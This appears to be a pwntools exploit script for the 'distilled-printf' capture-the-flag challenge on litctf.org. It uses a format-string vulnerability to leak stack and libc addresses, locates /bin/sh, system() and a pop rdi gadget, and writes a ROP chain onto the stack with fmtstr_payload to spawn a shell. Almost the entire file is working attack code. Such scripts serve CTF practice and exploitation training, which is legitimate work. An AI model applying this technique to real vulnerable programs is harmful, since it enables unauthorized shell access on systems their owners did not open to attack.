from pwn import *             


context.update(arch='x86_64', os='linux') 
context.terminal = ['wt.exe','wsl.exe'] 

HOST="litctf.org:31772"
ADDRESS,PORT=HOST.split(":")

BINARY_NAME="./distilled-printf_patched"
binary = context.binary = ELF(BINARY_NAME, checksec=False)
libc  = ELF('./libc-2.24.so', checksec=False)  # Load libc

if args.REMOTE:
    p = remote(ADDRESS,PORT)
    #p = remote(ADDRESS,PORT,ssl=True)
else:
    p = process(binary.path)    


#p = process(binary.path)        
# for i in range (1,160):    
#     payload = f"%{i}$p".encode()
#     p.sendline(payload)            
#     try:        
#         recv=p.recvline().strip()
#         # if b'0x7' in recv:
#         warn (f"PAYLOAD: {payload} RECV: {recv}")
#     except:
#         pass
payload = f"%{14}$p".encode() #stack
p.sendline(payload)            
stack = int(p.recvline().strip(),16)-0x7c
warn (f"stack {stack:#x}")

payload = f"%{44}$p".encode() #libc
p.sendline(payload)            
leaked_stdlib = int(p.recvline().strip(),16)-0x189927
libc.address = leaked_stdlib
warn (f"libc {libc.address:#x}")

# Find ROP gadgets and important addresses in libc
bin_sh = next(libc.search(b'/bin/sh'))  # Find "/bin/sh" string in libc
system = libc.sym['system']             # Find system() function address
rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]  # Find "pop rdi; ret" gadget
ret=pop_rdi+1  # Find "ret" gadget (usually next instruction)

warn(f"ret: {ret:#x}")
warn(f"pop rdi; ret: {pop_rdi:#x}")
warn(f"/bin/sh: {bin_sh:#x}")
warn(f"system: {system:#x}")

# gadget1=libc.address+0x4551f #wywala cos ale lapie troche
# gadget2=libc.address+0x4557a
# gadget3=libc.address+0xf0a51
# gadget4=libc.address+0xf18cb
# gadget=gadget1

#payload = fmtstr_payload(8, {stack: pop_rdi}, write_size='byte') 
#p.sendline(payload)

payload = fmtstr_payload(8, {
    stack: pop_rdi,
    stack+8: bin_sh,
    stack+16: system
}, write_size='byte')
p.sendline(payload)


p.interactive()
